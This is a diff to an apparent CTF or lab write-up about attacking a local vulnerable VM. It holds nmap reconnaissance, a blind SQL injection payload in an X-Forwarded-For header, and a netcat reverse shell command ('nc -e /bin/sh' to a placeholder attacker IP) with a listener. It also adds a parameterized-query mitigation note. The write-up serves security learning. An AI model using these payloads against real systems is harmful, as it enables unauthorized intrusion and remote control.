@@ -13,7 +13,7 @@ The first thing to do is to deploy the iso, I used VMWare, and get the ip (using
 ### Tecnologies used:
 
 ```
-nmap -sC -sV 192.168.77.128 -p-
+$ nmap -sC -sV 192.168.77.128 -p-
 
 -sV check services and versions
 -sC script scan
@@ -26,6 +26,8 @@ nmap -sC -sV 192.168.77.128 -p-
 
 ```
 ```
+$ echo -en "GET / HTTP/1.1\r\nHost: 192.168.77.128\r\nConnection: close\r\n\r\n" | netcat 192.168.77.128 80
+
 HTTP/1.1 200 OK
 Server: nginx/0.7.67
 Date: Thu, 21 Oct 2021 13:40:51 GMT
@@ -44,6 +46,14 @@ Content-Length: 1347
 ## Attack method
 
 ### Blind SQLi
+
+**Manually**
+
+```
+X-Forwarded-For:  sqli' or sleep(0) and '0'='0
+```
+
+**Using SQLMap**
 
 I use this website to learn more about the different uses of **sqlmap**:
 https://book.hacktricks.xyz/pentesting-web/sql-injection/sqlmap
@@ -93,6 +103,10 @@ Table: users
 
 **After some recon we can note only one point to explore, and gain a reverse shell: upload images feature.**
 
+## Blind SLQi Mitigation
+
+As with regular SQL injection, blind SQL injection attacks can be prevented through the careful use of parameterized queries, which ensure that user input cannot interfere with the structure of the intended SQL query.
+Use parametrized queries. Do not concatenate strings in your queries.
 
 
 ![image](https://user-images.githubusercontent.com/38219437/138444141-db3947ae-5757-4e5c-bfbb-19f0aeca7db2.png)
@@ -169,10 +183,10 @@ https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20an
 
 Attackers machine:
 ```
-nc -lvp 1234
+$ nc -lvp 1234
 ```
 
-Command cmd=
+Command c=
 ```
 nc -e /bin/sh <attacker_ip> <nc_listener_port>
 ```
